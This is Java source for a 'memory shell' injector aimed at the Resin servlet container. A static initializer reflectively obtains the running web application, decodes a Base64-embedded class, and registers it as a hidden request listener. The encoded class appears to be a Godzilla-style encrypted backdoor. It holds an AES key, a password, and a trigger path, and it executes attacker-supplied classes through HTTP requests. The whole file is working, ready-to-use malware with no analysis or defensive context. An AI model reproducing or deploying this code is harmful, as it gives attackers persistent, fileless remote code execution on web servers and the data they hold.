package core.memshell;

import javax.servlet.ServletRequestListener;
import java.lang.reflect.Method;

public class ResinListenerMemShell {
    static {
        Inject();
    }

    public ResinListenerMemShell() {
        Inject();
    }


    public static synchronized void Inject() {
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class servletInvocation = classLoader.loadClass("com.caucho.server.dispatch.ServletInvocation");

            Object contextRequest = servletInvocation.getMethod("getContextRequest").invoke(null);
            Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
            String ListenerBase64 = "yv66vgAAADMBiQoAaQDXCQBMANgJAEwA2QgA2gkATADbCADcCQBMAN0IAN4JAEwA3wcA4AoACgDXCgAKAOEKAAoA4goATADjCQBMAOQIAOUJAEwA5goAaQDnCgBpAOgIAOkKAOoA6wcA7AoAMQDtCgAWAO4KAOoA7woA6gDwBwDxCADyCgDzAPQKADEA9QoA8wD2BwD3CgDzAPgKACAA+QoAIAD6CgAxAPsIAPwKAC4A/QgA/gcAvwoALgD/BwDMCgEAAQEKADABAggBAwcBBAcAggcBBQcBBggBBwoALgEICAEJCAEKCAELCAEMCAENCgAuAQ4HAQ8KAC4BEAoAOgERCgESARMKARIBFAoBFQEWBwEXCgBMARgIARkLAEABGggBGwoAMQEcCwBAAR0LAEABHgoATAEfCgBMASAIASELASIBIwcBJAoALgElCgBMAOcKAEwBJgsBIgEnCAC+CwBAAScHASgKAFMA1woAMAEpCwBnASoKADEBKwoBLAEtCgAwAOIKAFMBLgoATAEvCgAxATAIATEIATIKABsBMwoALgE0BwE1CgBhANcKAGEBNgoAYQE3CgBMATgIATkHAToIATsHATwHAT0BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAHUxtZW1zaGVsbC9SZXNpbkxpc3RlbmVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwEkBwE+BwDxAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcBBgEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAAR2YXI1AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAAFvAQABZgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAVjbGF6egcBPwcBBAcBDwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAA3JlcQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAR2YXI5BwFABwEXBwE6BwFBAQAQZ2V0TWV0aG9kQnlDbGFzcwEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACm1ldGhvZE5hbWUBAApwYXJhbWV0ZXJzAQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsHAUIBAAZpbnZva2UBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAJvMQEAAWkBAAFJAQAHY2xhc3NlcwEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEABHZhcjcBAANvYmoBABNbTGphdmEvbGFuZy9PYmplY3Q7BwE1BwEFAQAWZ2V0UmVzcG9uc2VGcm9tUmVxdWVzdAEAUShMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDspTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABHZhcjMBAAR2YXI4AQAEdmFyMQEABHZhcjIBAApTb3VyY2VGaWxlAQAXUmVzaW5MaXN0ZW5lclNoZWxsLmphdmEMAHUAdgwAawBsDABtAG4BABAzYzZlMGI4YTljMTUyMjRhDABvAHABAARwQVMzDABxAHABABAvZmF2aWNvbmRlbW8uaWNvDAByAHABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBQwFEDAFFAUYMAHMAkAwAcwBwAQAFVVRGLTgMAHQAcAwAdQB8DAFHAUgBAANBRVMHAT4MAUkBSgEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAUsBTAwAdQFNDAFOAU8MAVABUQEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAVIMAUkBUwwBVAFVDAFWAVcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBWAFMDAB1AVkMAUUBWgwBWwFGAQAQamF2YS51dGlsLkJhc2U2NAwBXAFdAQAKZ2V0RW5jb2RlcgwBXgFfBwFCDADDAWAMAWEBYgEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFjAWQBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBZQFmAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAFnAWIMAHUBaAcBPwwBaQFqDAFrAWwHAUAMAW0BbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAM8A0AEAEFgtUmVxdWVzdGVkLVdpdGgMAW8AkAEADlhNTEhUVFBSZXF1ZXN0DAFwAXEMAXIBcwwBdACQDACeAJ8MAIMAhAEAEG1lbXNoZWxsLnBheWxvYWQHAUEMAXUBdgEAG21lbXNoZWxsL1Jlc2luTGlzdGVuZXJTaGVsbAwBdwF4DAB/AIAMAXkBegEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAF7AXwMAX0BfgwBfwGABwGBDAGCAWgMAYMBTAwAlACVDAF/AVoBAA5YbWxIVFRQUmVxdWVzdAEAB1N1Y2Nlc3MMAYQAdgwBhQFfAQATamF2YS91dGlsL0FycmF5TGlzdAwBhgF8DAGHAYgMALsAvAEACV9yZXNwb25zZQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAIX3JlcXVlc3QBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBACRqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0TGlzdGVuZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBABtqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3QBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1nZXRTdXBlcmNsYXNzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldFNlcnZsZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRIZWFkZXIBAAdpbmRleE9mAQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0dHJpYnV0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HwAEALYAiAACAAABJAB6AHsAAAAAASQArgCvAAEAjAAAACcABv8AdQAGBwCNBwC3BwC4BwC5BwC6BwAvAAD5AHsC+QAmQgcAjwQAggC7ALwAAQB3AAAAuAADAAYAAAAhAToEK8YAGissLbYAYDoEAUyn//I6BSu2ADtMp//oGQSwAAEABwARABQAGwADAHgAAAAmAAkAAACnAAMAqQAHAKsADwCsABEArwAUAK0AFgCuABsArwAeALIAeQAAAD4ABgAWAAUAmgCIAAUAAAAhAHoAewAAAAAAIQB0AJkAAQAAACEAvQBwAAIAAAAhAL4AvwADAAMAHgDAAMEABACMAAAADQAD/AADBwDCUAcAjwkAggDDAMQAAQB3AAABRQAFAAcAAABmuwBhWbcAYjoELcYAMwM2BRUFLb6iACktFQUyOgYZBsYAERkEGQa2ACy2AGNXpwAKGQQBtgBjV4QFAaf/1iortgAsLBkEA70ALrYAZMAAKMAAKMAAKLcAZToFGQUrLbYAK7A6BAGwAAEAAABhAGIAGwADAHgAAAAyAAwAAAC3AAkAuAANALkAFwC6AB0AuwAiALwAMAC+ADcAuQA9AMMAWgDEAGIAxQBkAMYAeQAAAFwACQAdABoAxQCXAAYAEAAtAMYAxwAFAAkAWQDIAMkABABaAAgAwADBAAUAZAACAMoAiAAEAAAAZgB6AHsAAAAAAGYAywCXAAEAAABmAL0AcAACAAAAZgC+AMwAAwCMAAAAKwAF/QAQBwDNAfwAHwcAzvoABvoABf8AJAAEBwCNBwDOBwCTBwAqAAEHAI8AIQDPANAAAQB3AAACQgACAAcAAAC/AU0rtgAsEma2ADlOLQS2AD0tK7YAPsAAZ02nAD9OK7YALBJotgA5OgQZBAS2AD0ZBCu2AD46BRkFtgAsEma2ADk6BhkGBLYAPRkGGQW2AD7AAGdNpwAFOgQsxwBjK7YALLYAOxJmtgA5Ti0EtgA9LSu2AD7AAGdNpwBFTiu2ACy2ADsSaLYAOToEGQQEtgA9GQQrtgA+OgUZBbYALLYAOxJmtgA5OgYZBgS2AD0ZBhkFtgA+wABnTacABToELLAABAACABoAHQAbAB4AVABXABsAXQB4AHsAGwB8ALgAuwAbAAMAeAAAAHYAHQAAAMwAAgDPAAwA0AARANEAGgDcAB0A0gAeANQAKQDVAC8A1gA3ANcAQwDYAEkA2QBUANsAVwDaAFkA3QBdAN8AagDgAG8A4QB4AOwAewDiAHwA5ACKAOUAkADmAJgA5wCnAOgArQDpALgA6wC7AOoAvQDuAHkAAACEAA0ADAAOANEApwADACkAKwCHAKcABAA3AB0AowCXAAUAQwARAJoApwAGAB4AOwDSAIgAAwBqAA4A0QCnAAMAigAuAIcApwAEAJgAIACjAJcABQCnABEAmgCnAAYAfABBANIAiAADAAAAvwB6AHsAAAAAAL8A0wBsAAEAAgC9ANQAbgACAIwAAABLAAb/AB0AAwcAjQcAuAcAuQABBwCP/wA5AAQHAI0HALgHALkHAI8AAQcAj/oAAWEHAI//AD8ABAcAjQcAuAcAuQcAjwABBwCP+gABAAEA1QAAAAIA1g==";
            byte[] ListenerClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class listenerClass = (Class) defineClass1.invoke(classLoader, ListenerClass, 0, ListenerClass.length);

            ServletRequestListener listenerObject = (ServletRequestListener) listenerClass.newInstance();

            // 4.X ListenerConfig | 3.X Listener
            Class ListenerConfigCls = null;
            try {
                ListenerConfigCls = classLoader.loadClass("com.caucho.server.webapp.ListenerConfig");
            } catch (Exception e) {
                ListenerConfigCls = classLoader.loadClass("com.caucho.server.webapp.Listener");
            }
            Object ListenerConfig = ListenerConfigCls.newInstance();

            Method m1 = ListenerConfig.getClass().getDeclaredMethod("setListenerClass", Class.class);
            m1.setAccessible(true);
            m1.invoke(ListenerConfig, listenerClass);

            // // 4.X getClass() ListenerConfig  | 3.X getClass().getSuperClass*() Listener
            Method m2 = null;
            try {
                m2 = webapp.getClass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            } catch (Exception e) {
                m2 = webapp.getClass().getSuperclass().getDeclaredMethod("addListener", ListenerConfig.getClass());
            }
            m2.setAccessible(true);
            m2.invoke(webapp, ListenerConfig);

        } catch (Exception e) {
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

}
